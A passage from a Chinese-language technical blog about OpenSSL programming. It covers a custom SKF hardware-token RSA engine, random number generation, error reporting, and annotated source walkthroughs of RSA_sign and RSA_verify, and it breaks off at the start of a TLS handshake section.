class="keyword">if</span> (r != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">RSA_free</span>(r);</span><br><span class="line">        r = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pkey != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">EVP_PKEY_free</span>(pkey);</span><br><span class="line">        pkey = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> iResult;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">skf_load_ssl_client_cert</span><span class="params">(ENGINE* e, SSL* ssl, STACK_OF(X509_NAME) * ca_dn, X509** pcert,</span></span></span><br><span class="line"><span class="params"><span class="function">                                    EVP_PKEY** ppkey, STACK_OF(X509) * *pother,</span></span></span><br><span class="line"><span class="params"><span class="function">                                    UI_METHOD* ui_method, <span class="type">void</span>* callback_data)</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* operation = <span class="string">&quot;skf_load_ssl_client_cert&quot;</span>;</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(Tag, <span class="string">&quot;%s&quot;</span>, operation);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getContainerType</span>() == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">skf_load_rsa_client_cert</span>(pcert, ppkey);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// only handle rsa, other return false</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">skf_rsa_priv_enc</span><span class="params">(<span class="type">int</span> flen, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* from, <span class="type">unsigned</span> <span class="type">char</span>* to, RSA* rsa,</span></span></span><br><span class="line"><span class="params"><span class="function">                     <span class="type">int</span> padding)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(Tag, <span class="string">&quot;skf_rsa_priv_enc from len %d, padding %d&quot;</span>, flen, padding);</span><br><span class="line">    <span class="type">int</span> ret = <span class="built_in">rsaDoSign</span>(from, flen, to, <span class="number">1024</span>);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(Tag, <span class="string">&quot;rsaDoSign ret %d&quot;</span>, ret);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> RSA_METHOD* skf_rsa_method = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">/* Prepare the ENGINE structure for registration */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">skf_bind_helper</span><span class="params">(ENGINE* e)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(Tag, <span class="string">&quot;skf_bind_helper&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set skf rsa engine method, use default method and diy some function</span></span><br><span class="line">    <span class="keyword">if</span> ((skf_rsa_method = <span class="built_in">RSA_meth_dup</span>(<span class="built_in">RSA_get_default_method</span>())) == <span class="literal">NULL</span> ||</span><br><span class="line">        <span class="comment">// do not need priv_dec</span></span><br><span class="line">        <span class="built_in">RSA_meth_set_priv_dec</span>(skf_rsa_method, <span class="literal">NULL</span>) == <span class="number">0</span> ||</span><br><span class="line">        <span class="comment">// skf provide priv_enc</span></span><br><span class="line">        <span class="built_in">RSA_meth_set_priv_enc</span>(skf_rsa_method, skf_rsa_priv_enc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">ENGINE_set_id</span>(e, engine_epass_id) || !<span class="built_in">ENGINE_set_name</span>(e, engine_epass_name) ||</span><br><span class="line">        !<span class="built_in">ENGINE_set_init_function</span>(e, epass_init) ||</span><br><span class="line">        <span class="comment">// set rsa method</span></span><br><span class="line">        !<span class="built_in">ENGINE_set_RSA</span>(e, skf_rsa_method) ||</span><br><span class="line">        <span class="comment">// if not set, sdf will load by default if possible</span></span><br><span class="line">        !<span class="built_in">ENGINE_set_flags</span>(e, ENGINE_FLAGS_NO_REGISTER_ALL) ||</span><br><span class="line">        !<span class="built_in">ENGINE_set_destroy_function</span>(e, epass_destroy) ||</span><br><span class="line">        !<span class="built_in">ENGINE_set_finish_function</span>(e, epass_finish) || !<span class="built_in">ENGINE_set_ctrl_function</span>(e, epass_ctrl) ||</span><br><span class="line">        !<span class="built_in">ENGINE_set_cmd_defns</span>(e, epass_cmd_defns) ||</span><br><span class="line">        !<span class="built_in">ENGINE_set_load_privkey_function</span>(e, epass_load_key) ||</span><br><span class="line">        <span class="comment">// set load client cert</span></span><br><span class="line">        !<span class="built_in">ENGINE_set_load_ssl_client_cert_function</span>(e, skf_load_ssl_client_cert)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-7-使用skf接口实现sm2国密引擎"><a href="#1-7-使用skf接口实现sm2国密引擎" class="headerlink" title="1.7. 使用skf接口实现sm2国密引擎"></a>1.7. 使用skf接口实现sm2国密引擎</h3><h2 id="2-随机数生成算法"><a href="#2-随机数生成算法" class="headerlink" title="2. 随机数生成算法"></a>2. 随机数生成算法</h2><ul>
<li>需要链接<code>-lcrypto</code></li>
<li>内部会获取<code>/dev/urandom</code>、<code>pid</code>、<code>tid</code>、<code>时间</code>作为种子，所以相同种子也会有不同随机数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/rand.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[<span class="number">255</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 设置种子，也可以不设置，加上会增加随机性</span></span><br><span class="line">    <span class="built_in">RAND_seed</span>(buf, <span class="keyword">sizeof</span> buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf1[<span class="number">255</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">RAND_bytes</span>(buf, <span class="keyword">sizeof</span> buf1);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-错误信息输出"><a href="#3-错误信息输出" class="headerlink" title="3. 错误信息输出"></a>3. 错误信息输出</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">ret = <span class="built_in">RSA_verify</span>(NID_sha1, testmd, <span class="number">20</span>, sig, len, rsa);</span><br><span class="line"><span class="keyword">if</span> (ret != <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> e = <span class="built_in">ERR_get_error</span>();</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">255</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;NID_sha1 verify ret &#123;&#125;, reason &#123;&#125;&quot;</span>, ret, <span class="built_in">ERR_error_string</span>(e, buf));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-rsa签名与校验"><a href="#4-rsa签名与校验" class="headerlink" title="4. rsa签名与校验"></a>4. rsa签名与校验</h2><p>RSA原理先看 <a href="/blogs/2022-03-23-cryptography/#2-RSA%E7%AE%97%E6%B3%95">RSA算法</a></p>
<h3 id="4-1-接口和结构体"><a href="#4-1-接口和结构体" class="headerlink" title="4.1. 接口和结构体"></a>4.1. 接口和结构体</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// openssl/rsa.h</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The following 2 functions sign and verify a X509_SIG ASN1 object inside</span></span><br><span class="line"><span class="comment"> * PKCS#1 padded RSA encryption</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">RSA_sign</span><span class="params">(<span class="type">int</span> type, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *m, <span class="type">unsigned</span> <span class="type">int</span> m_length,</span></span></span><br><span class="line"><span class="params"><span class="function">             <span class="type">unsigned</span> <span class="type">char</span> *sigret, <span class="type">unsigned</span> <span class="type">int</span> *siglen, RSA *rsa)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">RSA_verify</span><span class="params">(<span class="type">int</span> type, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *m, <span class="type">unsigned</span> <span class="type">int</span> m_length,</span></span></span><br><span class="line"><span class="params"><span class="function">               <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *sigbuf, <span class="type">unsigned</span> <span class="type">int</span> siglen, RSA *rsa)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>其中<code>m</code>和<code>m_length</code>是原文数据</li>
<li><code>sigret</code>和<code>siglen</code>是加密后的数据</li>
<li><code>type</code>定义了摘要算法类型，这里是重点，传入的m并不会直接进行加密，而是先经过摘要计算一次，在进行加密</li>
<li><code>rsa</code>是算法结构体，在计算过程中可以使用到，在不同的函数需要的结构体不一样，下面讲一下算法结构体</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// include/openssl/ossl_typ.h</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">rsa_st</span> RSA;</span><br><span class="line"></span><br><span class="line"><span class="comment">// crypto/rsa/rsa_local.h</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">rsa_st</span> &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The first parameter is used to pickup errors where this is passed</span></span><br><span class="line"><span class="comment">     * instead of an EVP_PKEY, it is set to 0</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> pad;</span><br><span class="line">    <span class="type">int32_t</span> version;</span><br><span class="line">    <span class="type">const</span> RSA_METHOD *meth;</span><br><span class="line">    <span class="comment">/* functional reference if &#x27;meth&#x27; is ENGINE-provided */</span></span><br><span class="line">    ENGINE *engine; <span class="comment">// 引擎，自定义算法时定义</span></span><br><span class="line">    BIGNUM *n;      <span class="comment">// 公钥和私钥都需要的数据，n=p*q</span></span><br><span class="line">    BIGNUM *e;      <span class="comment">// 公钥数据，验签需要</span></span><br><span class="line">    BIGNUM *d;      <span class="comment">// 私钥数据，加密需要</span></span><br><span class="line">    BIGNUM *p;      <span class="comment">// 选取的大质数，内部数据，加解密不需要这个</span></span><br><span class="line">    BIGNUM *q;      <span class="comment">// 选取的大质数，内部数据，加解密不需要这个</span></span><br><span class="line">    BIGNUM *dmp1;</span><br><span class="line">    BIGNUM *dmq1;</span><br><span class="line">    BIGNUM *iqmp;</span><br><span class="line">    <span class="comment">/* for multi-prime RSA, defined in RFC 8017 */</span></span><br><span class="line">    <span class="built_in">STACK_OF</span>(RSA_PRIME_INFO) *prime_infos;</span><br><span class="line">    <span class="comment">/* If a PSS only key this contains the parameter restrictions */</span></span><br><span class="line">    RSA_PSS_PARAMS *pss;</span><br><span class="line">    <span class="comment">/* be careful using this if the RSA structure is shared */</span></span><br><span class="line">    CRYPTO_EX_DATA ex_data;</span><br><span class="line">    CRYPTO_REF_COUNT references;</span><br><span class="line">    <span class="type">int</span> flags;</span><br><span class="line">    <span class="comment">/* Used to cache montgomery values */</span></span><br><span class="line">    BN_MONT_CTX *_method_mod_n;</span><br><span class="line">    BN_MONT_CTX *_method_mod_p;</span><br><span class="line">    BN_MONT_CTX *_method_mod_q;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * all BIGNUM values are actually in the following data, if it is not</span></span><br><span class="line"><span class="comment">     * NULL</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">char</span> *bignum_data;</span><br><span class="line">    BN_BLINDING *blinding;</span><br><span class="line">    BN_BLINDING *mt_blinding;</span><br><span class="line">    CRYPTO_RWLOCK *lock;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="4-2-RSA-sign源码解析"><a href="#4-2-RSA-sign源码解析" class="headerlink" title="4.2. RSA_sign源码解析"></a>4.2. <code>RSA_sign</code>源码解析</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// crypto/rsa/rsa_sign.c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">RSA_sign</span><span class="params">(<span class="type">int</span> type, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *m, <span class="type">unsigned</span> <span class="type">int</span> m_len,</span></span></span><br><span class="line"><span class="params"><span class="function">             <span class="type">unsigned</span> <span class="type">char</span> *sigret, <span class="type">unsigned</span> <span class="type">int</span> *siglen, RSA *rsa)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> encrypt_len, encoded_len = <span class="number">0</span>, ret = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *tmps = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *encoded = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里判断是否存在自定义sign函数，一般由引擎指定</span></span><br><span class="line">    <span class="keyword">if</span> (rsa-&gt;meth-&gt;rsa_sign) &#123;</span><br><span class="line">        <span class="keyword">return</span> rsa-&gt;meth-&gt;<span class="built_in">rsa_sign</span>(type, m, m_len, sigret, siglen, rsa);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 先进行编码，根据type做不同的编码，也就是摘要算法</span></span><br><span class="line">    <span class="comment">/* Compute the encoded digest. */</span></span><br><span class="line">    <span class="keyword">if</span> (type == NID_md5_sha1) &#123;</span><br><span class="line">        <span class="comment">// 这里看起来像是md5_sha1算法需要外部自己算好，传进来的只能是36位</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * NID_md5_sha1 corresponds to the MD5/SHA1 combination in TLS 1.1 and</span></span><br><span class="line"><span class="comment">         * earlier. It has no DigestInfo wrapper but otherwise is</span></span><br><span class="line"><span class="comment">         * RSASSA-PKCS1-v1_5.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (m_len != SSL_SIG_LENGTH) &#123;</span><br><span class="line">            <span class="built_in">RSAerr</span>(RSA_F_RSA_SIGN, RSA_R_INVALID_MESSAGE_LENGTH);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        encoded_len = SSL_SIG_LENGTH;</span><br><span class="line">        encoded = m;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 这一步会根据不用的type进行不同的编码，具体type定义在 openssl/obj_mac.h</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">encode_pkcs1</span>(&amp;tmps, &amp;encoded_len, type, m, m_len))</span><br><span class="line">            <span class="keyword">goto</span> err;</span><br><span class="line">        encoded = tmps;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断了编码后的数据必须小于rsa支持的加密长度减去RSA_PKCS1_PADDING会占用的最小长度</span></span><br><span class="line">    <span class="keyword">if</span> (encoded_len &gt; <span class="built_in">RSA_size</span>(rsa) - RSA_PKCS1_PADDING_SIZE) &#123;</span><br><span class="line">        <span class="built_in">RSAerr</span>(RSA_F_RSA_SIGN, RSA_R_DIGEST_TOO_BIG_FOR_RSA_KEY);</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 真正进行加密，使用的是编码后的数据进行加密</span></span><br><span class="line">    <span class="comment">// 默认使用RSA_PKCS1_PADDING算法进行添加padding，会自动添加padding</span></span><br><span class="line">    <span class="comment">// 注意加密使用的是私钥，所以rsa里面只需要存放私钥就可以了</span></span><br><span class="line">    encrypt_len = <span class="built_in">RSA_private_encrypt</span>(encoded_len, encoded, sigret, rsa,</span><br><span class="line">                                      RSA_PKCS1_PADDING);</span><br><span class="line">    <span class="keyword">if</span> (encrypt_len &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">    *siglen = encrypt_len;</span><br><span class="line">    ret = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">err:</span><br><span class="line">    <span class="built_in">OPENSSL_clear_free</span>(tmps, (<span class="type">size_t</span>)encoded_len);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-3-RSA-verify源码解析"><a href="#4-3-RSA-verify源码解析" class="headerlink" title="4.3. RSA_verify源码解析"></a>4.3. <code>RSA_verify</code>源码解析</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// crypto/rsa/rsa_sign.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * int_rsa_verify verifies an RSA signature in |sigbuf| using |rsa|. It may be</span></span><br><span class="line"><span class="comment"> * called in two modes. If |rm| is NULL, it verifies the signature for digest</span></span><br><span class="line"><span class="comment"> * |m|. Otherwise, it recovers the digest from the signature, writing the digest</span></span><br><span class="line"><span class="comment"> * to |rm| and the length to |*prm_len|. |type| is the NID of the digest</span></span><br><span class="line"><span class="comment"> * algorithm to use. It returns one on successful verification and zero</span></span><br><span class="line"><span class="comment"> * otherwise.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">int_rsa_verify</span><span class="params">(<span class="type">int</span> type, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *m, <span class="type">unsigned</span> <span class="type">int</span> m_len,</span></span></span><br><span class="line"><span class="params"><span class="function">                   <span class="type">unsigned</span> <span class="type">char</span> *rm, <span class="type">size_t</span> *prm_len,</span></span></span><br><span class="line"><span class="params"><span class="function">                   <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *sigbuf, <span class="type">size_t</span> siglen, RSA *rsa)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> decrypt_len, ret = <span class="number">0</span>, encoded_len = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *decrypt_buf = <span class="literal">NULL</span>, *encoded = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断siglen是否符合RSA中定义的可解密的长度</span></span><br><span class="line">    <span class="keyword">if</span> (siglen != (<span class="type">size_t</span>)<span class="built_in">RSA_size</span>(rsa)) &#123;</span><br><span class="line">        <span class="built_in">RSAerr</span>(RSA_F_INT_RSA_VERIFY, RSA_R_WRONG_SIGNATURE_LENGTH);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Recover the encoded digest. */</span></span><br><span class="line">    decrypt_buf = <span class="built_in">OPENSSL_malloc</span>(siglen);</span><br><span class="line">    <span class="keyword">if</span> (decrypt_buf == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">RSAerr</span>(RSA_F_INT_RSA_VERIFY, ERR_R_MALLOC_FAILURE);</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 第一步就是直接使用公钥进行解密，同样默认使用RSA_PKCS1_PADDING</span></span><br><span class="line">    <span class="comment">// verify需要的是公钥，所以rsa中只需要存放公钥就可以了</span></span><br><span class="line">    <span class="comment">// 返回的数据已经去除了padding</span></span><br><span class="line">    decrypt_len = <span class="built_in">RSA_public_decrypt</span>((<span class="type">int</span>)siglen, sigbuf, decrypt_buf, rsa,</span><br><span class="line">                                     RSA_PKCS1_PADDING);</span><br><span class="line">    <span class="keyword">if</span> (decrypt_len &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (type == NID_md5_sha1) &#123;</span><br><span class="line">        <span class="comment">// md5_sha1直接判断解密后的数据是否和传入的一致</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * NID_md5_sha1 corresponds to the MD5/SHA1 combination in TLS 1.1 and</span></span><br><span class="line"><span class="comment">         * earlier. It has no DigestInfo wrapper but otherwise is</span></span><br><span class="line"><span class="comment">         * RSASSA-PKCS1-v1_5.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (decrypt_len != SSL_SIG_LENGTH) &#123;</span><br><span class="line">            <span class="built_in">RSAerr</span>(RSA_F_INT_RSA_VERIFY, RSA_R_BAD_SIGNATURE);</span><br><span class="line">            <span class="keyword">goto</span> err;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (rm != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(rm, decrypt_buf, SSL_SIG_LENGTH);</span><br><span class="line">            *prm_len = SSL_SIG_LENGTH;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (m_len != SSL_SIG_LENGTH) &#123;</span><br><span class="line">                <span class="built_in">RSAerr</span>(RSA_F_INT_RSA_VERIFY, RSA_R_INVALID_MESSAGE_LENGTH);</span><br><span class="line">                <span class="keyword">goto</span> err;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">memcmp</span>(decrypt_buf, m, SSL_SIG_LENGTH) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">RSAerr</span>(RSA_F_INT_RSA_VERIFY, RSA_R_BAD_SIGNATURE);</span><br><span class="line">                <span class="keyword">goto</span> err;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == NID_mdc2 &amp;&amp; decrypt_len == <span class="number">2</span> + <span class="number">16</span></span><br><span class="line">               &amp;&amp; decrypt_buf[<span class="number">0</span>] == <span class="number">0x04</span> &amp;&amp; decrypt_buf[<span class="number">1</span>] == <span class="number">0x10</span>) &#123;</span><br><span class="line">        <span class="comment">// mdc2算法需要解密后的数据前两字节固定，解密后长度必须是18，然后判断原文和解密后的第3字节开始的16字节是否对应</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Oddball MDC2 case: signature can be OCTET STRING. check for correct</span></span><br><span class="line"><span class="comment">         * tag and length octets.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (rm != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(rm, decrypt_buf + <span class="number">2</span>, <span class="number">16</span>);</span><br><span class="line">            *prm_len = <span class="number">16</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (m_len != <span class="number">16</span>) &#123;</span><br><span class="line">                <span class="built_in">RSAerr</span>(RSA_F_INT_RSA_VERIFY, RSA_R_INVALID_MESSAGE_LENGTH);</span><br><span class="line">                <span class="keyword">goto</span> err;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">memcmp</span>(m, decrypt_buf + <span class="number">2</span>, <span class="number">16</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">RSAerr</span>(RSA_F_INT_RSA_VERIFY, RSA_R_BAD_SIGNATURE);</span><br><span class="line">                <span class="keyword">goto</span> err;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * If recovering the digest, extract a digest-sized output from the end</span></span><br><span class="line"><span class="comment">         * of |decrypt_buf| for |encode_pkcs1|, then compare the decryption</span></span><br><span class="line"><span class="comment">         * output as in a standard verification.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (rm != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="type">const</span> EVP_MD *md = <span class="built_in">EVP_get_digestbynid</span>(type);</span><br><span class="line">            <span class="keyword">if</span> (md == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">RSAerr</span>(RSA_F_INT_RSA_VERIFY, RSA_R_UNKNOWN_ALGORITHM_TYPE);</span><br><span class="line">                <span class="keyword">goto</span> err;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            m_len = <span class="built_in">EVP_MD_size</span>(md);</span><br><span class="line">            <span class="keyword">if</span> (m_len &gt; (<span class="type">size_t</span>)decrypt_len) &#123;</span><br><span class="line">                <span class="built_in">RSAerr</span>(RSA_F_INT_RSA_VERIFY, RSA_R_INVALID_DIGEST_LENGTH);</span><br><span class="line">                <span class="keyword">goto</span> err;</span><br><span class="line">            &#125;</span><br><span class="line">            m = decrypt_buf + decrypt_len - m_len;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Construct the encoded digest and ensure it matches. */</span></span><br><span class="line">        <span class="comment">// 这里就先对原文进行了编码，和RSA_sign逻辑一样</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">encode_pkcs1</span>(&amp;encoded, &amp;encoded_len, type, m, m_len))</span><br><span class="line">            <span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 然后判断编码后的和解密出来的是否一致</span></span><br><span class="line">        <span class="keyword">if</span> (encoded_len != decrypt_len</span><br><span class="line">            || <span class="built_in">memcmp</span>(encoded, decrypt_buf, encoded_len) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">RSAerr</span>(RSA_F_INT_RSA_VERIFY, RSA_R_BAD_SIGNATURE);</span><br><span class="line">            <span class="keyword">goto</span> err;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Output the recovered digest. */</span></span><br><span class="line">        <span class="keyword">if</span> (rm != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(rm, m, m_len);</span><br><span class="line">            *prm_len = m_len;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">err:</span><br><span class="line">    <span class="built_in">OPENSSL_clear_free</span>(encoded, (<span class="type">size_t</span>)encoded_len);</span><br><span class="line">    <span class="built_in">OPENSSL_clear_free</span>(decrypt_buf, siglen);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">RSA_verify</span><span class="params">(<span class="type">int</span> type, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *m, <span class="type">unsigned</span> <span class="type">int</span> m_len,</span></span></span><br><span class="line"><span class="params"><span class="function">               <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *sigbuf, <span class="type">unsigned</span> <span class="type">int</span> siglen, RSA *rsa)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 判断是否有自定义校验函数，没有就用默认的，一般引擎会指定</span></span><br><span class="line">    <span class="keyword">if</span> (rsa-&gt;meth-&gt;rsa_verify) &#123;</span><br><span class="line">        <span class="keyword">return</span> rsa-&gt;meth-&gt;<span class="built_in">rsa_verify</span>(type, m, m_len, sigbuf, siglen, rsa);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int_rsa_verify</span>(type, m, m_len, <span class="literal">NULL</span>, <span class="literal">NULL</span>, sigbuf, siglen, rsa);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="四、握手流程分析"><a href="#四、握手流程分析" class="headerlink" title="四、握手流程分析"></a>四、握手流程分析</h1><h2 id="1-前置知识"><a href="#1-前置知识" class="headerlink" title="1. 前置知识"></a>1. 前置知识</h2><h3 id="1-1-ssl握手的几个关键点"><a href="#1-1-ssl握手的几个关键点" class="headerlink" title="1.1. ssl握手的几个关键点"></a>1.1. ssl握手的几个关键点</h3><ol>
<li>密钥交换: 使用RSA密钥交换或ECDHE交换算法</li>
<li>身份认证: 要求服务端有自己的证书，并且私钥自己持有，过程中会使用私钥签名一段数据给对端使用公钥验签</li>
<li>对称加密: 上面密钥交换的最后会生成对称加密密钥，作为ssl后续数据传输的加密密钥</li>
<li>摘要算法: 用于保证数据完整性的算法</li>
</ol>
